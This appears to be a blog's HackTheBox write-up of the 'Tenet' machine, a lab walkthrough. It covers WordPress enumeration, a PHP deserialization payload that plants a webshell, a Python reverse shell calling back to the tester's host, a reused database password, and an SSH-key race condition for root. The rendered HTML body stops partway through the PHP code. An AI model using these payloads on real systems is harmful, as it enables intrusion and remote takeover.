<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Tenet | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Tenet HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/tenet/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/tenet/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Tenet "><meta property="og:description" content="Tenet HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-06-14T22:27:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png"><meta name=twitter:title content="Tenet "><meta name=twitter:description content="Tenet HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Tenet ","item":"https://s4ch.github.io/writeups/hackthebox/tenet/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tenet ","name":"Tenet ","description":"Tenet HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Tenet Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap wpscan bfac Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.91 scan initiated Sun May 2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223 Nmap scan report for 10.10.10.223 Host is up (0.028s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun May 2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds Web enumeration As we are facing a Wordpress we can launch a vulnerability scan + user enumeration with wpscan:\n1 $ wpscan --url http://tenet.htb -e u The two vulnerabilities found are authenticated so we can’t exploit them. Two users are found: neil, protagonist.\nIt’s possible to try to bruteforce the password for those two users but it’s not very efficient:\n1 $ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt I tried to find any vhost but without success:\n1 $ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:cyfun -H 'Host: cyfun.tenet.htb' -fs 10918 There is an interesting comment on wordpress:\ndid you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!\nA post is also giving another hint:\nWe’re looking for beta testers of our new time-management software, ‘Rotas’\n‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!\nFor more information regarding opting-in, watch this space.\nSo I tried to find some backup files with ffuf and bfac but I only got some false positives.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt ... .phps [Status: 403, Size: 274, Words: 20, Lines: 10] :: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 :: $ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt ... .phps [Status: 403, Size: 274, Words: 20, Lines: 10] :: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 :: $ bfac -u http://tenet.htb/sator $ bfac -u http://tenet.htb/rotas While you don’t find there is a file sator.php hosted on tenet.htb you have to guess it’s served with the IP address http://10.10.10.223/sator.php (default fallback vhost probably).\n1 2 [+] Grabbing users from text file [] Database updated We can find the backup file with bfac:\n1 2 3 4 5 6 7 $ bfac -u http://10.10.10.223/sator.php ... [i] URL: http://10.10.10.223/sator.php [$] Discovered: -\u003e {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514) [i] Findings: http://10.10.10.223/sator.php.bak (200) | (Content-Length: 514) Web exploitation sator.php.bak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u003c?php class DatabaseExport { public $user_file = 'users.txt'; public $data = ''; public function update_db() { echo '[+] Grabbing users from text file '; $this-\u003e data = 'Success'; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this -\u003euser_file, $this-\u003edata); echo '[] Database updated '; //\techo 'Gotta get this working properly...'; } } $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u003e update_db(); ?\u003e There is a PHP deserialization here that allow us to upload any arbitrary content.\nWe can even find a similar case on security stackexchange.\nMy PoC to generate the serialized webshell payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003c?php class DatabaseExport { public $user_file = 'cyfun.php'; public $data = '\u003c?php system($_GET[\"cmd\"])?\u003e'; } $klass = new DatabaseExport(); $payload = serialize($klass); echo $payload; Here the URL-encoded form:\nhttp://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}\nThen we can access teh webshell and execute a command: http://10.10.10.223/cyfun.php?cmd=id\n1 uid=33(www-data) gid=33(www-data) groups=33(www-data) We know the upload and command exec works so let’s execute a reverse shell:\n1 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.44\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' We receive it on our reverse shell:\n1 2 3 4 5 6 7 $ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) id INFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP) /bin/sh: 0: can't access tty; job control turned off $ uid=33(www-data) gid=33(www-data) groups=33(www-data) cat /etc/passwd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false neil:x:1001:1001:neil,,,:/home/neil:/bin/bash Shell upgrade /var/www/html/wordpress\n1 2 3 4 5 6 7 8 9 10 ... /** MySQL database username */ define( 'DB_USER', 'neil' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); ... We can re-use DB password over SSH: ssh neil@tenet.htb.\nPrivilege Escalation of Machine : from neil to root 1 2 3 4 5 6 7 $ sudo -l Matching Defaults entries for www-data on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User www-data may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh A script can be run as root via sudo: /usr/local/bin/enableSSH.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #!/bin/bash checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \"Successfully added $sshName to authorized_keys file!\" else /bin/echo \"Error in adding $sshName to authorized_keys file!\" fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \"Error in creating key file!\" if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u003e\u003e$tmpName checkFile $tmpName /bin/cat $tmpName \u003e\u003e/root/.ssh/authorized_keys /bin/rm $tmpName } key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\" addKey checkAdded Since mktemp will create a random file we need to make a race condition to write our SSH pub key into it.\n1 2 3 4 5 6 7 8 #!/bin/bash key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' while true do echo $key | tee /tmp/ssh-* \u003e /dev/null done We execute that while running sudo /usr/local/bin/enableSSH.sh. Several tries may be necessary because race conditions doesn’t always work the 1st time.\nThen we can connect as root.\nssh root@tenet.htb -i ~/.ssh/id_ed25519\n","wordCount":"1179","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png","datePublished":"2021-06-14T22:27:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/tenet/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Tenet</h1><div class=post-description>Tenet HackTheBox writeup</div><div class=post-meta><span title='2021-06-14 22:27:00 +0000 UTC'>June 14, 2021</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1179 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/tenet/tenet.png alt="Tenet HackTheBox Machine"><p>Tenet - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#shell-upgrade>Shell upgrade</a></li><li><a href=#privilege-escalation-of-machine--from-neil-to-root>Privilege Escalation of Machine : from neil to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Tenet</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/309>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap wpscan bfac
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.91 scan initiated Sun May  2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.223
</span></span><span class=line><span class=cl>Host is up (0.028s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
</span></span><span class=line><span class=cl>|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Sun May  2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=web-enumeration>Web enumeration<a hidden class=anchor aria-hidden=true href=#web-enumeration>#</a></h2><p>As we are facing a Wordpress we can launch a vulnerability scan + user enumeration
with wpscan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ wpscan --url http://tenet.htb -e u
</span></span></code></pre></td></tr></table></div></div><p>The two vulnerabilities found are authenticated so we can&rsquo;t exploit them.
Two users are found: <code>neil</code>, <code>protagonist</code>.</p><p>It&rsquo;s possible to try to bruteforce the password for those two users but it&rsquo;s not very efficient:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt
</span></span></code></pre></td></tr></table></div></div><p>I tried to find any vhost but without success:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:cyfun -H &#39;Host: cyfun.tenet.htb&#39; -fs 10918
</span></span></code></pre></td></tr></table></div></div><p>There is an interesting comment on wordpress:</p><blockquote><p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p></blockquote><p>A post is also giving another hint:</p><blockquote><p>We&rsquo;re looking for beta testers of our new time-management software, &lsquo;Rotas&rsquo;</p><p>&lsquo;Rotas&rsquo; will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!</p><p>For more information regarding opting-in, watch this space.</p></blockquote><p>So I tried to find some backup files with ffuf and bfac but I only got some false positives.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
</span></span><span class=line><span class=cl>:: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]
</span></span><span class=line><span class=cl>:: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ bfac -u http://tenet.htb/sator
</span></span><span class=line><span class=cl>$ bfac -u http://tenet.htb/rotas
</span></span></code></pre></td></tr></table></div></div><p>While you don&rsquo;t find there is a file sator.php hosted on tenet.htb you have to
guess it&rsquo;s served with the IP address http://10.10.10.223/sator.php (default fallback vhost probably).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] Grabbing users from text file
</span></span><span class=line><span class=cl>[] Database updated
</span></span></code></pre></td></tr></table></div></div><p>We can find the backup file with bfac:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ bfac -u http://10.10.10.223/sator.php
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>[i] URL: http://10.10.10.223/sator.php
</span></span><span class=line><span class=cl>[$] Discovered: -&gt; {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[i] Findings:
</span></span><span class=line><span class=cl>http://10.10.10.223/sator.php.bak (200) | (Content-Length: 514)
</span></span></code></pre></td></tr></table></div></div><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p><code>sator.php.bak</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>DatabaseExport</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$user_file</span> <span class=o>=</span> <span class=s1>&#39;users.txt&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=k>function</span> <span class=nf>update_db</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span> <span class=na>data</span> <span class=o>=</span> <span class=s1>&#39;Success&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=no>__DIR__</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$this</span> <span class=o>-&gt;</span><span class=na>user_file</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;[] Database updated &lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>//	echo &#39;Gotta get this working properly...&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
